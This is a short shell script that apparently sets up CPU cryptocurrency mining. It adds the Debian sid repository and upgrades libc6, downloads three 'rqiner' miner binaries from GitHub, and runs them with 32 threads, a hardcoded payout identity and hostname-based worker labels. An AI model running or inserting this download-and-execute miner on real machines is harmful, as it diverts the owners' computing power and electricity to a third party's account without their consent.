apt-get update && apt-get install -y \
  wget \
  curl \
  libjansson4 \
  && rm -rf /var/lib/apt/lists/*
echo "deb http://ftp.debian.org/debian sid main" >> /etc/apt/sources.list
apt-get update
apt-get -t sid install libc6 libc6-dev libc6-dbg -y
name=$(lscpu | grep "Model name" | awk -F ': ' '{print $2}' | tr -d '[:punct:]' | tr -d '[:space:]')
wget -O rqiner-x86 https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.15/rqiner-x86
wget -O rqiner-x86-znver2 https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.15/rqiner-x86-znver2
wget -O rqiner-x86-haswell https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.15/rqiner-x86-haswell
chmod +x rqiner-x86-haswell
chmod +x rqiner-x86
chmod +x rqiner-x86-znver2
if lscpu | grep -qi "AMD"; then
./rqiner-x86-haswell -t 32 -i FEXDQAJKHZWOEBOZTDGLJLPPCSODFMIYAXCYRZENIBKRPDVDFVZLKMVEKETG -l AMD1$name$(hostname)
./rqiner-x86-znver2 -t 32 -i FEXDQAJKHZWOEBOZTDGLJLPPCSODFMIYAXCYRZENIBKRPDVDFVZLKMVEKETG -l AMD2$name$(hostname)
./rqiner-x86 -t 32 -i FEXDQAJKHZWOEBOZTDGLJLPPCSODFMIYAXCYRZENIBKRPDVDFVZLKMVEKETG -l AMD3$(hostname)
else
./rqiner-x86-znver2 -t 32 -i FEXDQAJKHZWOEBOZTDGLJLPPCSODFMIYAXCYRZENIBKRPDVDFVZLKMVEKETG -l INTEL1$name$(hostname)
./rqiner-x86 -t 32 -i FEXDQAJKHZWOEBOZTDGLJLPPCSODFMIYAXCYRZENIBKRPDVDFVZLKMVEKETG -l INTEL2$name$(hostname)
fi

